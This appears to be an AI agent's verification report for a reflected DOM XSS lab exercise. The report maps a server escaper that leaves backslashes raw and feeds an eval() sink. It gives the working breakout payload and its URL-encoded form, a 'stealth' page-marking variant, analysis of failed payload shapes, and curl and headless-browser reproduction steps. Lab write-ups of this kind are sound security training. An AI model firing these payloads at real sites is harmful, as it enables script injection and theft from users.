# Verification — Reflected DOM XSS via eval(JSON)

## Methodology
1. Page-flow mapping (curl + file read): inline caller → external `searchResults.js`
   → XHR URL construction → `eval` sink → `displaySearchResults` consumers
   (`innerText`/`setAttribute` with static prefixes — safe, noted).
2. Endpoint characterization: benign JSON shape; multi-param rule (last wins);
   full-response diff across inputs (only `searchTerm` varies + result selection).
3. Escaper mapping per character (raw-byte level via xxd where repr is ambiguous):
   `"`→`\"`; `\` raw; LF/TAB/NUL raw; `<>'&` raw; UTF-8 raw.
4. Grammar-first payload derivation, each candidate VERIFIED against exact server
   bytes (curl → base64 → in-page `eval`, mirroring the sink's expression shape).
5. End-to-end page-load proof (real XHR path) with side-effect marker; then
   real-browser `alert(1)` + banner polls.

## Evidence

### 1. Flow + sink (curl page, fetched + read searchResults.js)
`search('search-results')` → `GET search-results?search=X` → `eval('var
searchResultsObj = ' + responseText)`. Benign XHR verified working headlessly
(`2 search results for 'test'` renders) — environment path is sound.

### 2. Escaper map (curl, byte-exact)
| Input | Output bytes | Verdict |
|---|---|---|
| `"` | `\"` | escaped (only defense) |
| `\` | `\` | RAW — the hole |
| LF / TAB / NUL | raw bytes (`0A`/`09`/`00` via xxd) | raw, but no code position → inert |
| `<>'&`é | raw | inert in JS-string context |
| `?search=AAA&search=BBB` | `searchTerm:"BBB"` | last-wins, no concat |

### 3. Winning payload (exact bytes → in-page eval → flag)
INPUT `x\"};window.__k=1;//` → server `{"results":[],"searchTerm":"x\\"};window.__k=1;//"}`
→ eval result: `OK k=1 term=x\` — executes, object intact, no throw.

### 4. End-to-end page proof (headless, real XHR path)
`/?search=x%5C%22%7D%3Bdocument.title%3D%27PAGEMARK%27%3B%2F%2F`
→ `<title>PAGEMARK</title>` AND `0 search results for 'x\'` — execution + normal
rendering (stealth: no breakage, no console errors surfaced).

### 5. Lab acceptance
Real browser, INPUT `x\"};alert(1);//` → `alert(1)` on load → `is-solved` (first poll).

### 6. Failed-shape analysis (each with its JS-grammar cause)
| Shape tried | Server bytes (value region) | Eval result | Cause |
|---|---|---|---|
| `x\"-alert(1);//` | `"x\\"-alert(1)//"}` | "Unexpected end of input" | `;` illegal in object-literal value position AND `//` eats the closing `}` → unclosed object |
| `x\"-alert(1)-\"x` family | valid-prefix then stranded | throw/inert variants | trailing `"` (template's) opens unterminated string; unescaped-side operands invalid |
| `"};alert(1);//` (no backslash) | `"\"};alert(1);//"}` | pure string, no breakout | server-escaped `\"` never terminates — terminator exists ONLY via `\`-shift |
| `\"}`-early shapes w/o `//` | trailing `"}` strands | throw | nothing consumes the template tail |
| `results[]` as vector | server DB data only | n/a | no attacker influence (match-selection only) |
| multi-param concat | last-wins | n/a | single value used |

### 7. Analyst-harness failures (operational lessons, all recovered)
| Failure | Cause | Fix |
|---|---|---|
| `Object.keys(eval-result)` threw | `eval('var o=…')` completion value is `undefined`, not the object | read the var in a SEPARATE evaluate step |
| Appended `; oo` after `//` in test | `//` comments to end of INPUT — my appended code was commented too | mirror the sink expression EXACTLY, assert vars separately |
| CDP renderer wedged (timeouts incl. `Page.enable`) | accidental `alert(1)` execution blocked headless renderer | no `alert` in proofs (flags only); recover by killing browser, fresh port/profile; `Page.handleJavaScriptDialog` useless once wedged this hard |
| `--dump-dom` + virtual-time XHR flakiness (early benign-shaped tests) | virtual budget vs real network timing | benign control FIRST (proves path), then payload; CDP + real-time settle for interaction-sensitive flows |

## Reproducibility
```
BASE=…
# escaper map
curl -s "$BASE/search-results?search=ENC%22%27%3C%3E%26" ; curl -s "$BASE/search-results?search=%5C" | xxd | tail -1
# exact-bytes eval check (base64 avoids ALL escape mangling across layers):
#   t=$(curl -s "$BASE/search-results?search=PAYLOAD"); b64(t) → in-page eval('var o = '+atob(b64))
# end-to-end: headless page load with flag payload, assert title
# acceptance: real browser with x\"};alert(1);// (URL: x%5C%22%7D%3Balert(1)%3B%2F%2F)
```

## Confirmation criteria
- CONFIRMED: escaper map (byte-exact), breakout grammar (flag set, object intact),
  end-to-end page execution + stealth render, real-browser acceptance.
- The five failed shapes are load-bearing knowledge: each maps a template-position
  constraint future agents will re-derive otherwise.